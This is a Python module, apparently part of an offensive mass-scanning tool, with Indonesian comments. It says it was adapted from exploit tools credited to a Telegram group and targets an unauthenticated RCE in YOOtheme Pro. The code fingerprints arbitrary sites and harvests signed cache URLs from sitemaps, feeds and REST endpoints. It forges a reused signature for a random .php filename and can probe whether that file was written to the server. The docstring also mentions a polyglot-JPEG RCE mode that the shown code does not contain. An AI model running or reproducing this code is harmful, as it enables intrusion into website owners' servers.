# cve_modules/cve_2026_102785.py
"""
CVE-2026-102785 — YOOtheme Pro 5.0.0-5.0.52 Unauthenticated RCE
Adaptasi dari tools exploit ANTID00T (t.me/jellyproject)
diubah jadi modul scanning untuk main.py.

Alur deteksi (ringan, tanpa local payload server):
  1. fetch homepage -> fingerprint YOOtheme
  2. discovery signed URL (homepage -> sitemap/feed/rest -> links)
  3. parse signature (cache/<file>-<key>.png)
  4. signature reuse check: ganti nama file ke .php -> cek status 200
     (kalau 200 = signature masih valid untuk file lain = VULN)
  5. optional write proof: GET probe file -> cek body

Mode:
  - full_rce=False : signature reuse check saja (TIDAK butuh local server)
  - full_rce=True  : upload polyglot JPEG + verifikasi RCE
                     (butuh PayloadServer jalan, jadi lu harus handle manual)
"""

import html as html_mod
import posixpath
import re
import urllib.parse
import urllib.request
import urllib.error
import ssl

# ── konfigurasi ─────────────────────────────────────────────────────────

DEFAULT_TIMEOUT = 15
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
     "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

WAF_HINTS_RE = re.compile(
    r"mod[_-]?security|cloudflare|sucuri|wordfence|imunify|firewall|waf|"
    r"security rule|blocked|access denied|406 not acceptable",
    re.I,
)

SITEMAP_LOC_RE = re.compile(r"<loc>\s*([^<\s]+)\s*</loc>", re.I)
FEED_LINK_RE = re.compile(r"<link>\s*([^<\s]+)\s*</link>", re.I)
REST_LINK_RE = re.compile(r'"link"\s*:\s*"([^"]+)"')
ROUTE_PARAM_RE = re.compile(r"[?&][\w.-]+=cache(?:/|%2F)", re.I)
YOO_MARKERS = (
    "yootheme", "wp-content/themes/yootheme", "templates/yootheme",
    "uk-navbar", "uk-grid", "/yootheme/cache/",
)

L1_PATHS = (
    "sitemap.xml", "wp-sitemap.xml", "sitemap_index.xml", "sitemap-1.xml",
    "robots.txt", "feed/", "?feed=rss2",
    "index.php?format=feed&type=rss",
    "wp-json/wp/v2/pages?per_page=50&_fields=link",
    "wp-json/wp/v2/posts?per_page=50&_fields=link",
    "index.php?option=com_content&view=featured",
    "index.php?option=com_content&view=article&id=1",
    "index.php?option=com_content&view=category&layout=blog&id=1",
    "index.php/blog/", "blog/", "index.php/blog/", "?p=1", "?page_id=2",
)

# SSL context — verify off (sama kayak tools asli)
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


# ── HTTP helpers ────────────────────────────────────────────────────────

def _http_get(url, timeout=DEFAULT_TIMEOUT, method="GET"):
    req = urllib.request.Request(url, method=method, headers={
        "User-Agent": UA,
        "Accept": "*/*",
    })
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_SSL_CTX)
    )
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if e.fp else b""), dict(e.headers or {})
    except Exception as e:
        return None, str(e).encode(), {}


def _fetch_follow(url, timeout=DEFAULT_TIMEOUT):
    current = url
    for _ in range(6):
        st, body, headers = _http_get(current, timeout)
        if st in (301, 302, 303, 307, 308):
            loc = (headers or {}).get("Location") or (headers or {}).get("location")
            if loc:
                nxt = urllib.parse.urljoin(current, loc)
                if nxt != current:
                    current = nxt
                    continue
        return current, st, body, headers
    return current, None, b"too many redirects", {}


def _looks_like_waf(status, headers, body):
    if status in (403, 406, 419, 501, 429):
        return True
    blob = " ".join(f"{k}: {v}" for k, v in (headers or {}).items())
    if isinstance(body, bytes):
        blob += body[:2048].decode("utf-8", "replace")
    return bool(WAF_HINTS_RE.search(blob))


# ── fingerprint & discovery ─────────────────────────────────────────────

def _yootheme_fingerprint(html_text):
    low = html_text.lower()
    return any(m in low for m in YOO_MARKERS)


def _looks_signed(u):
    if not re.search(r"hash=[0-9a-fA-F]{4,12}", u):
        return False
    low = u.lower()
    return (
        "yootheme=cache" in low
        or "/cache/" in u
        or "yootheme=cache%2f" in low
        or bool(ROUTE_PARAM_RE.search(u))
    )


def _extract_signed_urls(html_text, base_url):
    urls = set()
    text = html_mod.unescape(html_text or "")

    def _consider(u):
        u = u.rstrip("\\;").rstrip(",")
        if u and _looks_signed(u):
            absu = urllib.parse.urljoin(base_url, u)
            if "hash=" in absu:
                urls.add(absu)

    for m in re.finditer(r"(?:https?://|/)[^\s\"'<>]+", text):
        token = m.group(0)
        parts = re.split(r",(?=https?://|/)", token)
        for part in ([token] if len(parts) == 1 else parts):
            _consider(part)
    return sorted(urls)


def _urls_from_meta(text, base, cap):
    urls, seen = [], set()
    for rx in (SITEMAP_LOC_RE, FEED_LINK_RE, REST_LINK_RE):
        for m in rx.finditer(text):
            u = urllib.parse.urljoin(base, html_mod.unescape(m.group(1)))
            if u in seen:
                continue
            seen.add(u)
            urls.append(u)
            if len(urls) >= cap:
                return urls
    return urls


def _dedupe(urls, base=None):
    seen, out = set(), []
    for u in urls:
        k = u.rstrip("/")
        if base and k == base.rstrip("/"):
            continue
        if k not in seen:
            seen.add(k)
            out.append(u)
    return out


def _chained_discovery(final_url, root, html_text, timeout, max_pages=12):
    """Discovery signed URL dari homepage -> L1 -> L2 -> links."""
    notes = []

    urls = _extract_signed_urls(html_text, final_url)
    if urls:
        return urls, ["discovery L0: homepage"]

    # L1
    l1 = _dedupe([urllib.parse.urljoin(root, p) for p in L1_PATHS],
                 base=final_url)
    candidates = []
    for u in l1[:16]:
        st, body, _ = _http_get(u, timeout)
        if st != 200 or not body:
            continue
        text = body.decode("utf-8", "replace")
        found = _extract_signed_urls(text, u)
        if found:
            return found, [f"discovery L1: {u}"]
        is_meta = (
            u.endswith((".xml", ".txt")) or "/feed" in u
            or "format=feed" in u or "wp-json" in u
        )
        if is_meta:
            locs = _urls_from_meta(text, u, max_pages * 2)
            children = [x for x in locs if x.endswith(".xml")][:3]
            candidates += [x for x in locs if not x.endswith(".xml")]
            for cu in children:
                cst, cbody, _ = _http_get(cu, timeout)
                if cst == 200 and cbody:
                    ctext = cbody.decode("utf-8", "replace")
                    f2 = _extract_signed_urls(ctext, cu)
                    if f2:
                        return f2, [f"discovery L1: child sitemap {cu}"]
                    candidates += _urls_from_meta(ctext, cu, max_pages)
    notes.append(f"discovery L1: {len(candidates)} candidates")

    # L2
    if candidates:
        for u in _dedupe(candidates, base=final_url)[:max_pages]:
            st, body, _ = _http_get(u, timeout)
            if st == 200 and body:
                found = _extract_signed_urls(
                    body.decode("utf-8", "replace"), u
                )
                if found:
                    return found, [f"discovery L2: content {u}"]

    # L3 — link di homepage
    links, seen = [], set()
    for lk in re.findall(r'href="(https?://[^"]+|/[^"]+)"', html_text or ""):
        absu = urllib.parse.urljoin(final_url, lk)
        if urllib.parse.urlsplit(absu).netloc != \
                urllib.parse.urlsplit(final_url).netloc:
            continue
        if re.search(r"\.(css|js|png|jpe?g|gif|svg|ico|woff2?)$", absu, re.I):
            continue
        if absu.rstrip("/") in seen or \
                absu.rstrip("/") == final_url.rstrip("/"):
            continue
        seen.add(absu.rstrip("/"))
        links.append(absu)
    for u in links[:max_pages * 2]:
        st, body, _ = _http_get(u, timeout)
        if st == 200 and body:
            found = _extract_signed_urls(body.decode("utf-8", "replace"), u)
            if found:
                return found, [f"discovery L3: link {u}"]

    return [], notes


# ── signature parse & rebuild ───────────────────────────────────────────

def _parse_signed(url):
    p = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)

    for k, v in pairs:
        vu = urllib.parse.unquote_plus(v)
        if vu.startswith("cache/"):
            key = _derive_key(vu)
            base = urllib.parse.urlunsplit(
                (p.scheme, p.netloc, p.path, "", "")
            )
            return {
                "mode": "query",
                "qparam": k,
                "base": base,
                "raw_pairs": pairs,
                "file": vu,
                "key": key,
            }

    m = re.search(r"^(?P<prefix>.*/cache/)(?P<file>.+)$", p.path)
    if m:
        key = _derive_key(m.group("file"))
        base = urllib.parse.urlunsplit(
            (p.scheme, p.netloc, m.group("prefix"), "", "")
        )
        return {
            "mode": "path",
            "qparam": None,
            "base": base,
            "raw_pairs": pairs,
            "file": urllib.parse.unquote(m.group("file")),
            "key": key,
        }
    return None


def _derive_key(route_file):
    name = posixpath.basename(route_file)
    name = name[: name.rfind(".")] if "." in name else name
    return name.split("-")[-1]


def _rebuild_signed(signed, new_file, route_strong=True):
    q = []
    if signed["mode"] == "query":
        file_part = urllib.parse.quote_plus(new_file, safe="")
        route_val = "cache/" + file_part
        for k, v in signed["raw_pairs"]:
            if k == signed["qparam"]:
                q.append(urllib.parse.quote_plus(k) + "=" + route_val)
            else:
                q.append(urllib.parse.quote_plus(k) + "="
                         + urllib.parse.quote_plus(v))
        return signed["base"] + "?" + "&".join(q)
    file_part = urllib.parse.quote_plus(new_file, safe="")
    for k, v in signed["raw_pairs"]:
        q.append(urllib.parse.quote_plus(k) + "="
                 + urllib.parse.quote_plus(v))
    return signed["base"] + file_part + ("?" + "&".join(q) if q else "")


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_102785(target_url: str,
                          timeout: int = DEFAULT_TIMEOUT,
                          write_proof: bool = False) -> dict:
    """
    Cek apakah target rentan terhadap CVE-2026-102785 (YOOtheme Pro).

    Args:
        target_url : URL target (boleh tanpa scheme)
        timeout    : timeout HTTP request (default 15s)
        write_proof: kalau True, coba GET probe file ke path yang di-rewrite
                     untuk konfirmasi write berhasil (status 200).
                     Default False (cuma signature reuse check).

    Returns:
        {
            "vulnerable":  bool,
            "evidence":    str | None,
            "reason":      str,
            "signed_url":  str | None,
            "reuse_url":   str | None,
            "platform":    str | None,
            "notes":       list[str],
        }
    """
    notes = []

    # normalisasi
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url
    target_url = target_url.rstrip("/")

    # ── 1. fetch homepage ────────────────────────────────────────────
    final_url, status, body, headers = _fetch_follow(target_url, timeout)
    if status is None:
        return {"vulnerable": False, "evidence": None,
                "reason": f"unreachable: {body.decode(errors='replace')[:120]}",
                "signed_url": None, "reuse_url": None,
                "platform": None, "notes": notes}
    if _looks_like_waf(status, headers, body):
        notes.append(f"WAF signal on homepage (status={status})")

    html = body.decode(errors="replace")
    platform = _detect_platform(html)
    if not _yootheme_fingerprint(html):
        return {"vulnerable": False, "evidence": None,
                "reason": "yootheme_not_detected",
                "signed_url": None, "reuse_url": None,
                "platform": platform, "notes": notes}
    notes.append(f"yootheme fingerprint: yes (platform={platform})")

    # ── 2. discovery signed URL ──────────────────────────────────────
    root = _site_root(final_url)
    urls, dnotes = _chained_discovery(final_url, root, html, timeout)
    notes.extend(dnotes)
    if not urls:
        return {"vulnerable": False, "evidence": None,
                "reason": "no_signed_url_disclosed",
                "signed_url": None, "reuse_url": None,
                "platform": platform, "notes": notes}

    # ── 3. parse signature ──────────────────────────────────────────
    signed = None
    for u in urls:
        s = _parse_signed(u)
        if s and s["key"]:
            signed = s
            signed_url = u
            break
    if not signed:
        return {"vulnerable": False, "evidence": None,
                "reason": "signed_url_found_but_unparseable",
                "signed_url": urls[0], "reuse_url": None,
                "platform": platform, "notes": notes}
    notes.append(f"signed URL: {signed_url}")

    # ── 4. signature reuse check ────────────────────────────────────
    # ganti nama file ke .php (dengan suffix key) — kalau server balikin
    # 200 tanpa error signature, tandanya signature bisa dipakai ulang
    probe_name = f"cve{_rand_token(6)}-{signed['key']}.php"
    probe_url = _rebuild_signed(signed, probe_name, route_strong=True)
    st, resp_body, resp_headers = _http_get(probe_url, timeout)

    reuse_ok = False
    if st == 200:
        reuse_ok = True
        evidence = (f"signature reuse accepted for '{probe_name}' "
                    f"(status 200)")
    elif st == 400:
        return {"vulnerable": False,
                "evidence": None,
                "reason": "signature_rejected_400_patched",
                "signed_url": signed_url, "reuse_url": None,
                "platform": platform, "notes": notes}
    elif _looks_like_waf(st, resp_headers, resp_body):
        notes.append(f"WAF block on reuse probe (status={st})")
        return {"vulnerable": False,
                "evidence": f"signature reuse blocked by WAF (status={st})",
                "reason": "waf_blocked_reuse_probe",
                "signed_url": signed_url, "reuse_url": None,
                "platform": platform, "notes": notes}
    else:
        notes.append(f"reuse probe returned status={st}")

    if not reuse_ok:
        return {"vulnerable": False, "evidence": None,
                "reason": f"reuse_probe_status_{st}",
                "signed_url": signed_url, "reuse_url": None,
                "platform": platform, "notes": notes}

    # ── 5. optional write proof ─────────────────────────────────────
    if write_proof:
        # coba akses file probe di beberapa path cache
        candidates = []
        if platform == "wordpress":
            candidates.append(root + "wp-content/uploads/yootheme/cache/"
                              + probe_name)
        else:
            candidates.append(root + "images/yootheme/cache/" + probe_name)
            candidates.append(root + "media/yootheme/cache/" + probe_name)
        candidates.append(root + "cache/" + probe_name)

        for cu in candidates:
            st2, _, _ = _http_get(cu, timeout)
            if st2 == 200:
                notes.append(f"write proof accessible at {cu}")
                return {"vulnerable": True,
                        "evidence": f"signature reuse accepted; probe "
                                    f"accessible at {cu}",
                        "reason": "signature_reuse_and_write_proof",
                        "signed_url": signed_url,
                        "reuse_url": cu,
                        "platform": platform,
                        "notes": notes}
        notes.append("write proof not found on guessed paths")

    return {"vulnerable": True,
            "evidence": evidence,
            "reason": "signature_reuse_accepted",
            "signed_url": signed_url,
            "reuse_url": probe_url,
            "platform": platform,
            "notes": notes}


# ── internal helpers ────────────────────────────────────────────────────

def _rand_token(n=6):
    import random
    import string
    return "".join(random.choices(string.ascii_lowercase + string.digits,
                                  k=n))


def _site_root(base):
    p = urllib.parse.urlsplit(base)
    path = p.path
    for drop in ("index.php", "admin-ajax.php", "wp-admin/admin-ajax.php"):
        if path.endswith(drop):
            path = path[: -len(drop)]
    if not path.endswith("/"):
        path += "/"
    return urllib.parse.urlunsplit((p.scheme, p.netloc, path, "", ""))


def _detect_platform(html):
    hl = (html or "").lower()
    if "wp-content" in hl or "wp-json" in hl or "wordpress" in hl:
        return "wordpress"
    if "joomla" in hl or "/media/system/" in hl or "com_content" in hl:
        return "joomla"
    return "unknown"